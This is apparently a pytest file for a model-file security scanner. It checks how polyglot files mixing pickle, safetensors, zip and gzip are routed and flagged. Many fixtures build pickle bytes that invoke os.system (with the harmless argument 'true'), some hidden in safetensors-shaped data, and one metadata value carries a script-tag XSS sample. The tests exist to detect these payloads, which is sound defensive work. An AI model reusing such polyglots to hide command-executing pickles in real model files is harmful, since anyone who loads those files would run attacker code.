    with zipfile.ZipFile(archive_bytes, "w") as archive:
        archive.writestr("payload.pkl", _build_malicious_pickle())
    archive_path.write_bytes(b"SFX-STUB" + archive_bytes.getvalue() + b"TRAILING-JUNK")

    result = scan_file(str(archive_path))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_does_not_route_bogus_terminal_eocd_as_zip(tmp_path: Path) -> None:
    path = tmp_path / "not-a-zip.bin"
    fake_directory = b"not a central directory".ljust(46, b"x")
    fake_eocd = struct.pack(
        "<4s4H2LH",
        b"PK\x05\x06",
        0,
        0,
        1,
        1,
        len(fake_directory),
        0,
        0,
    )
    path.write_bytes(fake_directory + fake_eocd)

    result = scan_file(str(path))

    assert result.scanner_name != "zip"


def test_scan_file_malformed_zip64_locator_offset_fails_closed_without_raising(tmp_path: Path) -> None:
    path = tmp_path / "malformed-zip64.zip"
    locator = bytearray(20)
    locator[0:4] = b"PK\x06\x07"
    locator[8:16] = ((1 << 64) - 1).to_bytes(8, "little")
    locator[16:20] = (1).to_bytes(4, "little")
    eocd = bytearray(22)
    eocd[0:4] = b"PK\x05\x06"
    eocd[8:10] = (0xFFFF).to_bytes(2, "little")
    eocd[10:12] = (0xFFFF).to_bytes(2, "little")
    eocd[12:16] = (0xFFFFFFFF).to_bytes(4, "little")
    eocd[16:20] = (0xFFFFFFFF).to_bytes(4, "little")
    path.write_bytes(b"PK\x03\x04" + (b"\x00" * 60) + locator + eocd)

    result = scan_file(str(path), config={"cache_enabled": False})

    assert result.scanner_name == "zip"
    assert result.success is False
    assert any(check.name == "ZIP Central Directory Preflight" for check in result.checks)


@pytest.mark.parametrize(
    "header_length",
    [ord("V"), 0x560280],
    ids=["protocol-0", "protocol-2"],
)
def test_scan_file_routes_pickle_safetensors_polyglot_to_pickle(
    tmp_path: Path,
    header_length: int,
) -> None:
    polyglot = tmp_path / "payload.unknown"
    _write_pickle_safetensors_polyglot(polyglot, header_length)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(
        str(polyglot),
        config={"scanners": ["pickle"], "cache_enabled": False},
    )

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_safetensors_pickle_operand_crossing_short_probe(tmp_path: Path) -> None:
    pickle_tail = (b"A" * file_detection.PROTO0_1_MAX_PROBE_BYTES) + b"\n0cos\nsystem\n(Vtrue\ntR."
    header_length = ord("V")
    metadata = json.dumps(
        {
            "tensor": {
                "dtype": "U8",
                "shape": [len(pickle_tail)],
                "data_offsets": [0, len(pickle_tail)],
            }
        },
        separators=(",", ":"),
    ).encode()
    assert len(metadata) <= header_length
    polyglot = tmp_path / "truncated-operand.unknown"
    polyglot.write_bytes(
        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + pickle_tail
    )

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_security_pickle_in_complete_frame(tmp_path: Path) -> None:
    pickle_body = b"cos\nsystem\n(Vtrue\ntR."
    pickle_tail = b"\n0\x95" + struct.pack("<Q", len(pickle_body)) + pickle_body
    polyglot = tmp_path / "framed-pickle.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_frame_spanning_binbytes_safetensors_collision_to_pickle(tmp_path: Path) -> None:
    # CPython joins the active frame remainder with the underlying stream for BINBYTES payloads.
    frame_body = b"B" + struct.pack("<I", 4) + b"AB"
    pickle_tail = (
        b"\n0\x95"
        + struct.pack("<Q", 2)
        + b"\x95X"
        + struct.pack("<Q", len(frame_body))
        + frame_body
        + b"CD0cos\nsystem\n(Vtrue\ntR."
    )
    polyglot = tmp_path / "frame-spanning-binbytes.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


@pytest.mark.parametrize(
    "invalid_suffix",
    [
        b"\xff",
        b"00N.",
        b"\x80\x07N.",
        b"\x95" + struct.pack("<Q", 1_000_000) + b"N.",
    ],
    ids=["unknown-opcode", "stack-underflow", "unsupported-protocol", "truncated-late-frame"],
)
def test_scan_file_keeps_reached_pickle_security_signal_after_late_error(
    tmp_path: Path,
    invalid_suffix: bytes,
) -> None:
    pickle_tail = b"\n0cos\nsystem\n(Vtrue\ntR" + invalid_suffix
    polyglot = tmp_path / "late-error.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_security_pickle_in_follow_on_stream(tmp_path: Path) -> None:
    pickle_tail = b"\n0N." + b"cos\nsystem\n(Vtrue\ntR."
    polyglot = tmp_path / "follow-on-stream.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_follow_on_pickle_using_persistent_memo(tmp_path: Path) -> None:
    first_stream = b"\n0\x8c\x02os\x94\x8c\x06system\x94N."
    second_stream = b"h\x00h\x01\x93(X\x04\x00\x00\x00true\x85R."
    polyglot = tmp_path / "persistent-memo.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), first_stream + second_stream)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    assert any(issue.rule_code in {"S201", "S205"} for issue in result.issues)


def test_scan_file_routes_empty_module_stack_global_safetensors_collision_to_pickle(tmp_path: Path) -> None:
    pickle_tail = b"\n0U\x00U\x06system\x93(Vtrue\ntR."
    polyglot = tmp_path / "empty-module-stack-global.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    assert any(
        issue.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and issue.details.get("invoked") is True
        and issue.details.get("associated_global") == ".system"
        for issue in result.issues
    )


def test_scan_file_keeps_empty_bytes_stack_global_safetensors_collision_clean(tmp_path: Path) -> None:
    polyglot = tmp_path / "empty-bytes-stack-global.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), b"\n0C\x00\x8c\x02os\x93.")

    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


def test_scan_file_routes_security_pickle_after_early_frame_stop(tmp_path: Path) -> None:
    framed_benign_stream = b"\x95" + struct.pack("<Q", 20) + b"N." + (b"\x00" * 18)
    pickle_tail = b"\n0" + framed_benign_stream + b"cos\nsystem\n(Vtrue\ntR."
    polyglot = tmp_path / "post-frame-stream.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_security_pickle_after_valid_list_setitem(tmp_path: Path) -> None:
    pickle_tail = b"\n0]NaK\x00Ns0cos\nsystem\n(Vtrue\ntR."
    polyglot = tmp_path / "list-setitem.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_security_pickle_after_memoized_list_mutation(tmp_path: Path) -> None:
    pickle_tail = b"\n0]\x94Na0h\x00K\x00Ns0cos\nsystem\n(Vtrue\ntR."
    polyglot = tmp_path / "memoized-list-mutation.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_security_pickle_after_boolean_list_index(tmp_path: Path) -> None:
    pickle_tail = b"\n0]Na\x89Ns0cos\nsystem\n(Vtrue\ntR."
    polyglot = tmp_path / "boolean-list-index.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


@pytest.mark.parametrize(
    "pickle_tail",
    [b"\n0Ncos\nsystem\n.", b"\n0}q\x000Nq\x000cos\nsystem\n."],
    ids=["residual-stack", "memo-overwrite"],
)
def test_scan_file_routes_cpython_valid_safetensors_pickle_overlap(
    tmp_path: Path,
    pickle_tail: bytes,
) -> None:
    header_length = ord("V")
    metadata = json.dumps(
        {
            "tensor": {
                "dtype": "U8",
                "shape": [len(pickle_tail)],
                "data_offsets": [0, len(pickle_tail)],
            }
        },
        separators=(",", ":"),
    ).encode()
    polyglot = tmp_path / "cpython-valid-overlap.unknown"
    polyglot.write_bytes(
        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + pickle_tail
    )

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_binpersid_safetensors_polyglot_to_pickle(tmp_path: Path) -> None:
    prefix = b"\x88Q.\x00\x00\x00\x00\x00"
    header_length = struct.unpack("<Q", prefix)[0]
    polyglot = tmp_path / "persistent-id.unknown"
    polyglot.write_bytes(prefix + b"{}" + (b" " * (header_length - 2)))

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(
        str(polyglot),
        config={"scanners": ["pickle"], "cache_enabled": False},
    )

    assert result.scanner_name == "pickle"
    assert any(issue.rule_code == "S212" for issue in result.issues)


@pytest.mark.parametrize(
    "header_length",
    [0x2E51, 0x2E52, 0x2E62, 0x2E81, 0x2E92, 0x2E93],
    ids=["binpersid", "reduce", "build", "newobj", "newobj-ex", "stack-global"],
)
def test_scan_file_keeps_stack_invalid_pickle_shaped_safetensors_clean(
    tmp_path: Path,
    header_length: int,
) -> None:
    metadata = b'{"tensor":{"dtype":"U8","shape":[1],"data_offsets":[0,1]}}'
    metadata += b" " * (header_length - len(metadata))
    safetensors_path = tmp_path / "stack-invalid-pickle-shape.unknown"
    safetensors_path.write_bytes(struct.pack("<Q", header_length) + metadata + b"\x00")

    result = scan_file(str(safetensors_path), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


def test_scan_file_keeps_large_aligned_safetensors_header_collision_clean(tmp_path: Path) -> None:
    header_length = 80
    data_length = file_detection.PROTO0_1_MAX_PROBE_BYTES + 4096
    metadata = json.dumps(
        {
            "tensor": {
                "dtype": "U8",
                "shape": [data_length],
                "data_offsets": [0, data_length],
            }
        },
        separators=(",", ":"),
    ).encode()
    assert len(metadata) <= header_length
    safetensors_path = tmp_path / "aligned-header.unknown"
    safetensors_path.write_bytes(
        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + bytes(data_length)
    )

    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"

    result = scan_file(str(safetensors_path), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


@pytest.mark.parametrize(
    "pickle_body",
    [b"cos\nsystem\n.", b"cos\nsystem\nN."],
    ids=["balanced-stack", "residual-stack"],
)
def test_scan_file_keeps_truncated_frame_safetensors_collision_clean(
    tmp_path: Path,
    pickle_body: bytes,
) -> None:
    pickle_tail = b"\n0\x95" + struct.pack("<Q", 1_000_000) + pickle_body
    header_length = ord("V")
    metadata = json.dumps(
        {
            "tensor": {
                "dtype": "U8",
                "shape": [len(pickle_tail)],
                "data_offsets": [0, len(pickle_tail)],
            }
        },
        separators=(",", ":"),
    ).encode()
    safetensors_path = tmp_path / "truncated-frame.unknown"
    safetensors_path.write_bytes(
        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + pickle_tail
    )

    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"

    result = scan_file(str(safetensors_path), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


def test_scan_file_routes_executable_nested_frame_safetensors_collision_to_pickle(tmp_path: Path) -> None:
    pickle_body = b"cos\nsystem\n."
    pickle_tail = (
        b"\n0\x95" + struct.pack("<Q", 20) + b"\x95" + struct.pack("<Q", len(pickle_body)) + pickle_body + bytes(32)
    )
    safetensors_path = tmp_path / "nested-frame.unknown"
    _write_safetensors_pickle_tail(safetensors_path, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(safetensors_path)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "pickle"

    result = scan_file(str(safetensors_path), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_large_safetensors_pickle_from_declared_frame_end(tmp_path: Path) -> None:
    operand = b"x" * SAFETENSORS_ROUTING_HEADER_PARSE_BYTES
    pickle_tail = (
        b"\n0B"
        + struct.pack("<I", len(operand))
        + operand
        + b"0\x95"
        + struct.pack("<Q", 20)
        + b"N."
        + bytes(18)
        + b"cos\nsystem\n."
    )
    polyglot = tmp_path / "large-frame-end.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    assert any(
        issue.details.get("pickle_rule_code") == "DANGEROUS_GLOBAL"
        and issue.details.get("associated_global") == "os.system"
        for issue in result.issues
    )


def test_scan_file_keeps_failed_pickle_load_with_memo_safetensors_collision_clean(tmp_path: Path) -> None:
    polyglot = tmp_path / "failed-load-with-memo.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), b"\n0]q\x00acos\nsystem\n.")

    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


def test_pickle_frame_alternates_share_one_work_budget() -> None:
    block_end = 24
    frame_fork_block = (
        b"\x95"
        + struct.pack("<Q", block_end - 9)
        + b"N."
        + b"\x95"
        + struct.pack("<Q", block_end - (11 + 9))
        + b"N.\xff\xff"
    )
    payload = (frame_fork_block * 20) + b"N."
    budget = file_detection._PickleProbeWorkBudget()

    state = file_detection._classify_initial_pickle_security_signal(
        payload,
        sample_is_prefix=False,
        available_stream_length=len(payload),
        _work_budget=budget,
    )

    assert state is None
    assert budget.remaining_frame_branches == 0
    assert budget.remaining_opcodes >= 0


def test_pickle_tuple_hashability_is_cached_across_opcodes() -> None:
    item_count = 4000
    payload = b"}(" + (b"N" * item_count) + b"tq\x00Ns" + (b"h\x00Ns" * item_count) + b"."
    budget = file_detection._PickleProbeWorkBudget()

    state = file_detection._classify_initial_pickle_security_signal(
        payload,
        sample_is_prefix=False,
        available_stream_length=len(payload),
        _work_budget=budget,
    )

    assert state is False
    assert len(budget.hashability_cache) == 1


def test_scan_file_routes_hashable_tuple_alias_pickle_overlap(tmp_path: Path) -> None:
    pickle_tail = b"\n0N" + (b"2\x86" * 25) + b"p0\n0(g0\nNd0cos\nsystem\n(Vtrue\ntR."
    polyglot = tmp_path / "tuple-alias-pickle.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


@pytest.mark.parametrize("header_length", [ord("F"), ord("S")], ids=["invalid-float", "invalid-string"])
def test_scan_file_keeps_invalid_long_line_operand_safetensors_collision_clean(
    tmp_path: Path,
    header_length: int,
) -> None:
    pickle_tail = (b"A" * file_detection.PROTO0_1_MAX_PROBE_BYTES) + b"\n0cos\nsystem\n(Vignored\ntR."
    safetensors_path = tmp_path / "invalid-line-operand.unknown"
    _write_safetensors_pickle_tail(safetensors_path, header_length, pickle_tail)

    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"

    result = scan_file(str(safetensors_path), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


def test_scan_file_keeps_semantically_invalid_pickle_prefix_safetensors_clean(tmp_path: Path) -> None:
    pickle_tail = b"\n0\x96" + struct.pack("<Q", 1) + b"x" + b"M\x00\x01a0cos\nsystem\n(Vtrue\ntR."
    safetensors_path = tmp_path / "invalid-bytearray-append.unknown"
    _write_safetensors_pickle_tail(safetensors_path, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"

    result = scan_file(str(safetensors_path), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


def test_scan_file_keeps_unhashable_pickle_dict_key_safetensors_clean(tmp_path: Path) -> None:
    pickle_tail = b"\n0}]Ns0cos\nsystem\n(Vtrue\ntR."
    safetensors_path = tmp_path / "unhashable-dict-key.unknown"
    _write_safetensors_pickle_tail(safetensors_path, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"

    result = scan_file(str(safetensors_path), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


@pytest.mark.parametrize(
    "pickle_tail",
    [b"\n0(2cos\nsystem\n(Vtrue\ntR.", b"\n0(\x85cos\nsystem\n(Vtrue\ntR."],
    ids=["dup-mark", "tuple1-mark"],
)
def test_scan_file_keeps_unexpected_pickle_mark_safetensors_clean(
    tmp_path: Path,
    pickle_tail: bytes,
) -> None:
    safetensors_path = tmp_path / "unexpected-pickle-mark.unknown"
    _write_safetensors_pickle_tail(safetensors_path, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"

    result = scan_file(str(safetensors_path), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


@pytest.mark.parametrize(
    "pickle_body",
    [b"NNR.", b"NN\x93.", b"N)\x81.", b"N}b.", b"(No."],
    ids=["reduce", "stack-global", "newobj", "build", "obj"],
)
def test_scan_file_keeps_known_type_invalid_pickle_safetensors_clean(
    tmp_path: Path,
    pickle_body: bytes,
) -> None:
    safetensors_path = tmp_path / "known-type-invalid-pickle.unknown"
    _write_safetensors_pickle_tail(safetensors_path, ord("V"), b"\n0" + pickle_body)

    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"

    result = scan_file(str(safetensors_path), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


def test_scan_file_routes_none_state_build_safetensors_overlap_to_pickle(tmp_path: Path) -> None:
    pickle_tail = b"\n0NNbcos\nsystem\n(Vtrue\ntR."
    polyglot = tmp_path / "none-state-build-pickle.unknown"
    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)

    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_merges_safetensors_findings_for_pickle_overlap(tmp_path: Path) -> None:
    pickle_tail = b"\n0cos\nsystem\n(Vtrue\ntR."
    polyglot = tmp_path / "metadata-and-pickle.unknown"
    _write_safetensors_pickle_tail(
        polyglot,
        0x0156,
        pickle_tail,
        custom_metadata={"note": "<script>alert(1)</script>"},
    )

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    assert "safetensors" in result.metadata["supplemental_scanners"]
    _assert_system_pickle_issue(result)
    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in result.checks)

    safetensors_only_result = scan_file(
        str(polyglot),
        config={"cache_enabled": False, "scanners": ["safetensors"]},
    )
    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in safetensors_only_result.checks)
    assert safetensors_only_result.success is False


@pytest.mark.parametrize("opcode", [b"B", b"X"], ids=["binbytes", "binunicode"])
def test_scan_file_routes_oversized_pickle_safetensors_polyglot_to_pickle(
    tmp_path: Path,
    opcode: bytes,
) -> None:
    polyglot = tmp_path / "oversized.unknown"
    _write_oversized_pickle_safetensors_polyglot(polyglot, opcode)

    with polyglot.open("rb") as handle:
        header_length = struct.unpack("<Q", handle.read(8))[0]
        assert handle.read(1) == b"{"
    assert header_length > SAFETENSORS_ROUTING_HEADER_PARSE_BYTES
    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    _assert_system_pickle_issue(result)


def test_scan_file_routes_valid_gzip_safetensors_polyglot_to_compressed(tmp_path: Path) -> None:
    polyglot = tmp_path / "gzip-safetensors-polyglot.py.gz"
    _write_gzip_safetensors_polyglot(polyglot)

    assert file_detection.detect_file_format(str(polyglot)) == "compressed"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "gzip"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "gzip"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "compressed"
    assert "safetensors" in result.metadata["supplemental_scanners"]
    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in result.checks)
    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and "os.system" in check.message
        for check in result.checks
    )


@pytest.mark.parametrize(
    "trailing_data",
    [b"benign trailing safetensors bytes", b"\x1f\x8bBAD gzip-like trailing bytes"],
    ids=["ordinary", "invalid-gzip-prefix"],
)
def test_scan_file_keeps_gzip_prefix_with_trailing_safetensors_data_clean(
    tmp_path: Path,
    trailing_data: bytes,
) -> None:
    polyglot = tmp_path / "gzip-prefix-safetensors.unknown"
    _write_gzip_safetensors_polyglot(
        polyglot,
        include_xss=False,
        include_python_payload=False,
        trailing_data=trailing_data,
    )

    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


def test_scan_file_detects_python_in_gzip_safetensors_with_nonmember_trailing_data(tmp_path: Path) -> None:
    polyglot = tmp_path / "gzip-python-trailing-safetensors.unknown"
    _write_gzip_safetensors_polyglot(
        polyglot,
        include_xss=False,
        trailing_data=b"benign trailing safetensors bytes",
    )

    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert "compressed" in result.metadata["supplemental_scanners"]
    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and "os.system" in check.message
        for check in result.checks
    )

    aggregate = scan_model_directory_or_file(str(polyglot), cache_enabled=False)
    assert determine_exit_code(aggregate) == 1


def test_scan_file_keeps_zero_prefixed_nonmember_gzip_trailing_data_clean(tmp_path: Path) -> None:
    polyglot = tmp_path / "gzip-zero-prefix-safetensors.unknown"
    _write_gzip_safetensors_polyglot(
        polyglot,
        include_xss=False,
        include_python_payload=False,
        trailing_data=(b"\x00" * 4096) + b"benign trailing safetensors bytes",
    )

    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert not result.issues


def test_scan_file_keeps_gzip_zero_padding_security_overlap_compressed(tmp_path: Path) -> None:
    polyglot = tmp_path / "gzip-padding-safetensors.py.gz"
    _write_gzip_safetensors_polyglot(
        polyglot,
        include_xss=False,
        trailing_data=b"\x00" * 32,
    )

    assert gzip.decompress(polyglot.read_bytes())
    assert file_detection.detect_file_format(str(polyglot)) == "compressed"
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "gzip"
    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "gzip"

    result = scan_file(str(polyglot), config={"cache_enabled": False})

    assert result.scanner_name == "compressed"
    assert any(
        check.name == "Compressed Wrapper Stream Decode"
        and check.status == CheckStatus.FAILED
        and check.details.get("scan_outcome_reason") == "compressed_stream_decode_failed"
        for check in result.checks
    )
    assert result.success is False


def test_scan_file_keeps_late_crc_failure_gzip_safetensors_polyglot_compressed(tmp_path: Path) -> None:
